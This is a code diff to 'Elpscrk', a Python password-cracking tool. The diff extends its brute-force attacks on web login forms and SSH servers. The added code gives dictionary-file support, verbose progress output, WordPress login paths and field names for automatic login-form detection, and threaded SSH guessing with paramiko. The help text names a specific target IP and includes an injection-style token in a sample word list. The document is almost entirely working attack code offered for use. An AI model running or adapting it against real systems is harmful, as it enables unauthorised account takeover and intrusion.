@@ -1,4 +1,4 @@
-import itertools, string, time, sys, urllib, socket, requests, paramiko
+import itertools, string, time, sys, urllib, socket, requests, paramiko, os, threading
 from datetime import timedelta
 socket.setdefaulttimeout(2)
 
@@ -16,6 +16,17 @@ else:
 if sys.platform == "ios":
 	console.set_font()
 	console.set_color()
+
+if len(sys.argv) > 2:
+	if sys.argv[1] == "-f":
+		pass_dict = sys.argv[2]
+		try:
+			open(pass_dict)
+		except:
+			print "[-] Invalid Filename '%s'"%pass_dict
+			pass_dict = False
+else:
+	pass_dict = False
 
 logo = """      _                     _   
      | |                   | |  
@@ -39,13 +50,17 @@ def elphelp():
 	print " -ip\tSelect host target"
 	print " -usr\tAdd target username"
 	print " -psw\tSelect password file"
-	print " quit\tClose Elpscrk"
+	print " exit\tClose Elpscrk"
+	print "System Arguments:"
+	print " -f\t Use dictionary rather then password gerneration\n"
+	print " -v\t Verbose mode"
 	print "\nUsage:\n"
 	print "  elpscrk -list pswList.list-add mr; robot; usa; network\n"
 	print "  elpscrk -ip 222.12.154.102 -usr mich05654 -psw pswList"
 	print "\nLegal Example:\n"
 	print "  elpscrk -list pswList.list-add admin;testfire;'1=1\n"
 	print "  elpscrk -ip 65.61.137.117 -usr admin -psw pswList\n"
+	print "  -f <dictionary file path>\n"
 
 def terminal(text=False,inp=False):
 	console.set_color(0.0,0.3,0.8)
@@ -71,7 +86,7 @@ def query_vector(ip):
 		"/admin/login.htm", "/login/login",
 		"/login/login.htm",
 		"/user/login.php", "/bank/login.aspx", "/Account/Login",
-		"Profile/Login", "/admin", "/signin"
+		"Profile/Login", "/admin", "/signin", "/wp-login.php","/wp-admin", "/index.php"
 		]
 	confirm = [
 		"Login:","Password:","Username:",
@@ -83,14 +98,16 @@ def query_vector(ip):
 		'id="id"', 'name="uid"',
 		'type="email"', 'type="username"',
 		'type="user"', 'type="usr"',
-		'type="id"', 'type="uid"', 'id="Email"', 'id="email"', 'id=User', 'name="user_name"'
+		'type="id"', 'type="uid"', 'id="Email"', 'id="email"', 'id=User', 'name="user_name"',
+		'id="user_login"','id="usernamefld"'
 		]
 	pswtypes = [
 		'id="passw"','id="password"',
 		'id="pass"', 'id="psw"',
 		'type="passw"','type="password"',
 		'type="pass"', 'type="psw"',
-		'type="secret"', 'name="user_pass"'
+		'type="secret"', 'name="user_pass"',
+		'id="passwordfld"'
 		]
 	try:
 		http = urllib.urlopen("http://"+ip)
@@ -187,25 +204,52 @@ def query_vector(ip):
 def brute(url, uid, usr, pid, passwords, lkf, rate, alt=False, real=0):
 	start_time = time.time()
 	failed = True
-	for pws in passwords:
-		pws = pws.replace("\n","")
-		values = {uid : usr, pid : pws}
-		r = requests.post(url, data=values)
-		info = r.content
-		if real == 0:
-			break
-		if lkf[0] not in info and lkf[1] not in info and len(info) > 20:
-			elapsed_time = time.time() - start_time
-			times = str(timedelta(seconds=elapsed_time))[:-4]
-			terminal("Time Elapsed:"+str(times))
-			if not alt:
-				terminal(url.split("://")[0].upper()+" Vector")
-			else:
-				terminal("HTTP-ALT Vector")
-			terminal("Password: %s"%pws)
-			failed = False
-			break
-	if failed:
+	if real == True and type(real) == bool:
+		total = open(pass_dict).read().count("\n")
+		c = 0
+		verbose = "-v" in sys.argv
+		with open(pass_dict) as _pws:
+			for pws in _pws:
+				if verbose:
+					sys.stdout.write("\rItem %s of %s  "%(c,total))
+					c += 1
+				pws = pws.replace("\n","")
+				values = {uid : usr, pid : pws}
+				r = requests.post(url, data=values)
+				info = r.content
+				if real == 0:
+					break
+				if lkf[0] not in info and lkf[1] not in info and len(info) > 20:
+					elapsed_time = time.time() - start_time
+					times = str(timedelta(seconds=elapsed_time))[:-4]
+					terminal("Time Elapsed:"+str(times))
+					if not alt:
+						terminal(url.split("://")[0].upper()+" Vector")
+					else:
+						terminal("HTTP-ALT Vector")
+					terminal("Password: %s"%pws)
+					failed = False
+					break
+	else:
+		for pws in passwords:
+			pws = pws.replace("\n","")
+			values = {uid : usr, pid : pws}
+			r = requests.post(url, data=values)
+			info = r.content
+			if real == 0:
+				break
+			if lkf[0] not in info and lkf[1] not in info and len(info) > 20:
+				elapsed_time = time.time() - start_time
+				times = str(timedelta(seconds=elapsed_time))[:-4]
+				terminal("Time Elapsed:"+str(times))
+				if not alt:
+					terminal(url.split("://")[0].upper()+" Vector")
+				else:
+					terminal("HTTP-ALT Vector")
+				terminal("Password: %s"%pws)
+				failed = False
+				break
+	if failed and real == 1:
 		terminal("Successfully Failed")
 
 def sshbrute(user,pswrd,ip,port,timeout=2):
@@ -218,25 +262,42 @@ def sshbrute(user,pswrd,ip,port,timeout=2):
 		terminal("SSH Vector")
 		terminal("Password: %s" %pswrd)
 		sshConnection.close()
+		globals()["stop"] = True
 	except Exception as e:
-		print e
 		pass
 
 def sshb(user,passwords,host,timeout=2):
 	ip,port = host.split(":")
 	port = int(port)
 	dm = []
-	for p in passwords:
-		t = threading.Thread(target=sshbrute,args=(user,p,ip,port,timeout))
-		t.daemon = True
-		if p not in dm:
-			if globals()["stop"]:
-				sys.exit()
-			sys.stderr = t.start()
-		time.sleep(0.05)
-		dm.append(p)
+	if pass_dict:
+		val = open(pass_dict)
+		tms = open(pass_dict).read().count("\n")
+		verbose = "-v" in sys.argv
+		for _ in range(tms):
+			p = val.next().replace("\n","")
+			t = threading.Thread(target=sshbrute,args=(user,p,ip,port,timeout))
+			if verbose:
+				sys.stdout.write("\rItem %s of %s  "%(str(_),str(tms)))
+			t.daemon = True
+			if p not in dm:
+				if globals()["stop"]:
+					sys.exit(1)
+				sys.stderr = t.start()
+			time.sleep(0.05)
+			dm.append(p)
+	else:
+		for p in passwords:
+			t = threading.Thread(target=sshbrute,args=(user,p,ip,port,timeout))
+			t.daemon = True
+			if p not in dm:
+				if globals()["stop"]:
+					sys.exit()
+				sys.stderr = t.start()
+			time.sleep(0.05)
+			dm.append(p)
 
-def AAVector(ip,username,passwords):
+def AAVector(ip,username,passwords,pd=False):
 	globals()["FAIL"] = False
 	for _ in range(2):
 		q = query_vector(ip)
@@ -297,25 +358,37 @@ def AAVector(ip,username,passwords):
 		if ssh != False:
 			if terminal("Attack HTTP Vector [Y/N]",True).lower() == "y":
 				for _ in range(2):
+					if pd == True and type(pd) == bool and _ == 1:
+						_ = True
 					brute(http_url, http_ubox, username, http_pbox, passwords, http_find, 0.5, real=_)
 		else:
 			for _ in range(2):
+				if pd == True and type(pd) == bool and _ == 1:
+					_ = True
 				brute(http_url, http_ubox, username, http_pbox, passwords, http_find, 0.5, real=_)
 	elif https != False:
 		if ssh != False:
 			if terminal("Attack HTTPS Vector [Y/N]",True).lower() == "y":
 				for _ in range(2):
+					if pd == True and type(pd) == bool and _ == 1:
+						_ = True
 					brute(https_url, https_ubox, username, https_pbox, passwords, https_find, 0.5, real=_)
 		else:
 			for _ in range(2):
-				brute(https_url, https_ubox, username, https_pbox, passwords, https_find, 0.5, real=_)
+				if pd == True and type(pd) == bool and _ == 1:
+					_ = True
+					brute(https_url, https_ubox, username, https_pbox, passwords, https_find, 0.5, real=_)
 	if httpalt != False:
 		if ssh != False:
 			if terminal("Attack HTTP-ALT Vector [Y/N]",True).lower() == "y":
 				for _ in range(2):
+					if pd == True and type(pd) == bool and _ == 1:
+						_ = True
 					brute(httpalt_url, httpalt_ubox, username, httpalt_pbox, passwords, httpalt_find, 0.5, True, real=_)
 		else:
 			for _ in range(2):
+				if pd == True and type(pd) == bool and _ == 1:
+					_ = True
 				brute(httpalt_url, httpalt_ubox, username, httpalt_pbox, passwords, httpalt_find, 0.5, True, real=_)
 	if ssh != False:
 		if http != False:
@@ -334,6 +407,7 @@ def mix():
 	return m
 
 def elpscrk():
+	globals()["stop"] = False
 	for cur in range(1):
 		extend = mix()
 		words = []
@@ -344,7 +418,8 @@ def elpscrk():
 		stop = False
 		
 		if sys.platform == "ios":
-			console.set_font("Menlo",12)
+			if int(os.uname()[4][6]) < 7:
+				console.set_font("Menlo",12)
 		
 		while 1:
 			try:
@@ -370,7 +445,7 @@ def elpscrk():
 					if ipf != "pswList":
 						words = [open(ipf).read().split("\n")]
 					break
-				if w == "quit":
+				if w == "quit" or w == "exit":
 					sys.exit(1)
 			except Exception as e:
 				print
@@ -387,6 +462,9 @@ def elpscrk():
 		else:
 			r = len(words)
 		
+		if pass_dict:
+			break
+		
 		for _ in range(1,r+1):
 			cword.append(list(itertools.permutations(words,_)))
 		
@@ -402,7 +480,18 @@ def elpscrk():
 		
 		terminal("List Count: %s Type: alphanum" % len(finals))
 		start_time = time.time()
-		AAVector(iip,iusr,finals)
+		AAVector(globals()["iip"],iusr,finals)
+		if not FAIL:
+			elapsed_time = time.time() - start_time
+			times = str(timedelta(seconds=elapsed_time))[:-4]
+			terminal()
+			terminal("Time Elapsed:"+str(times))
+	
+	if pass_dict:
+		finals = ""
+		terminal("List Count: %s Type: alphanum" % len(open(pass_dict).readlines()))
+		start_time = time.time()
+		AAVector(globals()["iip"],iusr,finals,pd=True)
 		if not FAIL:
 			elapsed_time = time.time() - start_time
 			times = str(timedelta(seconds=elapsed_time))[:-4]
